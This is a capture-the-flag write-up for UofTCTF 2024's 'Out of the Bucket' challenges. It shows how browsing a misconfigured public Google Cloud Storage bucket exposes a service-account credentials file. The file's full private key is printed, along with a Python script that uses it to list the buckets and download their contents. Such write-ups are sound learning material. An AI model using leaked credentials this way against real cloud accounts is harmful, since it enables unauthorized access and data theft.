# Uoftctf-2024
#Out of the Bucket
Check out my flag website!
Author: windex
https://storage.googleapis.com/out-of-the-bucket/src/index.html
````
First, visit the website according to the given link:

![image](https://github.com/k1ll50m30n3/Uoftctf-2024/assets/69716087/c880c8f3-55c2-45e3-ade7-5c001796523f)

I can immediately see its path, it seems to be a static website, so I tried to edit its path by deleting `index.html` and reloading but I didn't get anything back, so I continued to delete `src/index.html` then gets the document tree. Here I can see the files (index.html, antwerp.jpg, guam.jpg, style.css) exported in the initial web interface and in addition there is a file `funny.json` and a path `src\dont_show.json`

![image](https://github.com/k1ll50m30n3/Uoftctf-2024/assets/69716087/ffd2ce42-9d07-467b-a98a-536f55d20ffe)

I access the funny.json file following its path (secret/funny.json) 

![image](https://github.com/k1ll50m30n3/Uoftctf-2024/assets/69716087/37aa62bd-66a2-4ca8-8272-2000989e8e52)

Looking at its content, I see it contains authentication information...hmmm I haven't used it for now. I proceed to access the path 'src/dont_show' and my browser automatically downloaded it to my computer, then I open it with Notepad.

![image](https://github.com/k1ll50m30n3/Uoftctf-2024/assets/69716087/ea1c06be-cc0f-4bd4-ba5a-52a807bd8dad)

And I finally got the flag for this challenge.

``````

#Out of the Bucket 2
This is a continuation of "Out of the Bucket". Take a look around and see if you find anything!
Author: windex
``````
Next, for this challenge, I think I have to reuse the authentication information from the first challenge (funny.json file) that I haven't used yet.
I noticed the information fields in the file like oauth,... and I noticed that the website path had 'storage.googleapis.com', I searched for information on the internet and got a some information about 'Google Cloud Storage with credentials'
(`https://stackoverflow.com/questions/52808848/how-to-initialize-google-cloud-storage-with-credentials`)

![image](https://github.com/k1ll50m30n3/Uoftctf-2024/assets/69716087/aafb5752-36d6-498e-8941-f3abd1ca2ea5)

Didn't disappoint me, I found a few articles on stackoverfow, and now I can get an accurate opinion on everything I was thinking. The value fields are as shown in the article, they correspond to the value fields in the file 'funny.json'.
My task now is to use the authentication information in the funny.json file to be able to access the file content stored on Google Cloud Storage.
Based on the information in the article on Stackoverflow, I wrote a python code file to access Google Cloud Storage.

`from google.cloud import storage
from google.oauth2 import service_account

credentials_dict ={
  "type": "service_account",
  "project_id": "out-of-the-bucket",
  "private_key_id": "21e0c4c5ef71d9df424d40eed4042ffc2e0af224",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDWxpWEDNiWgMzz\nxDDF64CspqiGPxkrHfhS4/PX8BrxNjUMPAH7vYHE3KbgQsmPhbCte9opnSLdMqec\nWjll8lRZGEy73xhWd2e3tVRAf53r+pW/p6MTOsz3leUkQAscG4hmOVOpGb1AkfuE\n62NErJVZIgQCowrBdFGbPxQc/IRQJKzrCFfKOWSHLvnngr4Ui5CSr6OM33dfpD+v\nQSLkEQheYCXmHwh/Wf8b27be+RzfOp/hOyjKsJOmDvFu2+rrx24t8hCptof3BYol\nUjpaiB8Qcct/HoKOEvZ/S5rW6toQizP8t4t7urC2i70JdH+Y4Qw/AZJNuLo/5wW1\n+x8i3FIDAgMBAAECggEABaGapVC06RVNdQ1tffL+d7MS8296GHWmX34B6bqDlP7S\nhenuNLczoiwVkAcQQ9wXKs/22Lp5rIpkd1FXn0MAT9RhnAIYdZlB4JY3iaK5oEin\nXn67Dt5Ze3BfBq6ghpx43L1KDUKogfs8jgVMoANVEyDfhrYsVQWDZ5T60QZp7bP2\n0zSDSACZpFzdf1vXzOhero8ykwM3keQiCIKWYkeMGsX8oHyWr1fz7AkU+pLciV67\nek10ItJUV70n2C65FgrW2Z1TpPKlpNEm8jQLSax9Bi89HuFEw8UjTfxKKzhLFXEu\nudtAyebt/PC4HS9FLBioo3bAy8vL3o00b7+raVyJQQKBgQD3IWaD5q5s7H0r10S/\n7IUhP1TDYhbLh7pupbzDGzu9wCFCMItwTEm9nYVNToKwV+YpeyoptEHQa4CAVp21\nO4+W7mBQgYemimjTtx1bIW8qzdQ9+ltQXyFAxj6m3KcuAsAzSpcHkbP46lCL5QoT\nTS6T06Fs4xvnTKtBdPeisSgiIwKBgQDee+mp5gsk8ynnp6fx0/liuO3AZxpTYcP8\nixaXLQI6CI4jQP2+P+FWNCTmEJxMaddXNOmmTaKu25S2H0KKMiQkQPuwBqskck3J\npVTHudnUuZAZWE7YPg40MJgg5OQhMVwiqGWL76FT2bubIdNm4LQyxvDeK82XQYl8\nszeOXfJeoQKBgGQqSoXdwwbtF5Lkbr4nnJIsPCvxHvIhskPUs1yVNjKjpBdS28GJ\nej37kaMS1k+pYOWhQSakJCTY3b2m3ccuO/Xd6nXW+mdbJD/jsWdVdtxvjr4MMmSy\nGiVJ9Ozm9G/mt4ZSjkKIIN0cA8ef7uSB3QYXug8LQi0O2z7trM1pZq3nAoGAMPhD\nOSMqRsrC6XtMivzmQmWD5zqKX9oAAmE26rV8bPufFYFjmHGFDq1RhdYYIPWW8Vnz\nJ6ik6ynntKJyyeo5bEVlYJxHJTGHj5+1ZnSwzpK9dearDAu0oqYjhfH7iJbNuc8o\n8sEe2E7vbTjnyBgjcZ26PJyVlvpU4b6stshU5aECgYEA7ZESXuaNV0Er3emHiAz4\noEStvFgzMDi8dILH+PtC3J2EnguVjMy2fceQHxQKP6/DCFlNqf9KUNqJBKVGxRWP\nIM1rcoAmf0sGQ5gl1B1K8PidhOi3dHF0nkYvivuMoj7sEyr9K88y69kdpVJ3J556\nJWqkWLCz8hx+LcQPfDJu0YE=\n-----END PRIVATE KEY-----\n",
  "client_email": "image-server@out-of-the-bucket.iam.gserviceaccount.com",
  "client_id": "102040203348783466577",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/image-server%40out-of-the-bucket.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}

credentials = service_account.Credentials.from_service_account_info(credentials_dict)
client = storage.Client( credentials=credentials) 
buckets=list(client.list_buckets())
print(buckets) # get list bucket 
bucket_flag = client.get_bucket('flag-images') #access to bucket
#bucket_flag = client.get_bucket('out-of-the-bucket')

for blob in bucket_flag.list_blobs():
	print(blob)
	filename = blob.name.replace('/', '_') 	
	blob.download_to_filename('flag/'+ filename) #download file to folder './flag'
	print("download file: {}".format(blob.name))`

Run the code and get the following results:

![image](https://github.com/k1ll50m30n3/Uoftctf-2024/assets/69716087/ccdb769f-649f-4bf7-ad65-a31c0e0620ad)

To explain the code:
I access Google Cloud Storage through:
`credentials = service_account.Credentials.from_service_account_info(credentials_dict
client = storage.Client( credentials=credentials)`
Next, I got information about the existing buckets on Google Cloud Storage using `buckets=list(client.list_buckets())` as you can see in the code execution results, we have 2 buckets: `flag-images` and `out-of-the-bucket` in first line.
Next, I proceeded to access bucket `flag-images` because I also tried accessing bucket `out-of-the-bucket` before but didn't get anything of value.
Proceed to query the blob in the bucket. blob.name includes the entire directory structure + filename, so if you want the same file name as in the bucket, you might want to extract it first (instead of replacing `/` with `_ `)
After completing the download process, I checked the downloaded content in the 'flag' folder.

![image](https://github.com/k1ll50m30n3/Uoftctf-2024/assets/69716087/9048ec8d-f08d-445e-a6fa-cfd384e2ccb3)

I noticed that there is an image file '256x192_xa.png' that is different from other image files.

![image](https://github.com/k1ll50m30n3/Uoftctf-2024/assets/69716087/cd4458f2-ec5d-4dda-bb8a-8c44f3f74e72)

Finnally, I got the flag for this challenge!!!
